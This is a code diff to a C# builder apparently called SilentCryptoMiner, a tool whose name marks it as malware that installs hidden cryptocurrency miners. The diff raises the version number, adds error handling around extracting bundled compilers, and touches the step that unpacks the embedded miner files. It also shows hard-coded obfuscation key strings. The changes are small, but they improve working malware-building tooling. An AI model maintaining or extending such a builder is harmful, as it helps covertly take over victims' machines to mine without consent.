@@ -43,7 +43,7 @@ namespace SilentCryptoMiner
         public string UNAMKEY = "UXUUXUUXUUCommandULineUUXUUXUUXU";
         public string UNAMIV = "UUCommandULineUU";
 
-        public string builderVersion = "3.0.0";
+        public string builderVersion = "3.0.2";
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -220,13 +220,21 @@ namespace SilentCryptoMiner
                     Directory.Delete(compilerPath, true);
                 }
 
-                if (!Directory.Exists(compilerPath))
+                try
                 {
-                    BuildLog("Extracting compilers... ");
-                    using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
+                    if (!Directory.Exists(compilerPath))
                     {
-                        archive.ExtractToDirectory(compilerPath);
+                        BuildLog("Extracting compilers...");
+                        using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Compilers)))
+                        {
+                            archive.ExtractToDirectory(compilerPath);
+                        }
                     }
+                } 
+                catch (Exception ex)
+                {
+                    BuildError(true, "Error: An error occured while extracting the compilers: " + ex.Message);
+                    return;
                 }
 
                 string filesPath = Path.Combine(Path.GetDirectoryName(savePath), "UFiles");
@@ -234,7 +242,7 @@ namespace SilentCryptoMiner
                 {
                     Directory.Delete(filesPath, true);
                 }
-                BuildLog("Extracting miner files... ");
+                BuildLog("Extracting miner files...");
                 using (var archive = new ZipArchive(new MemoryStream(Properties.Resources.Files)))
                 {
                     archive.ExtractToDirectory(filesPath);
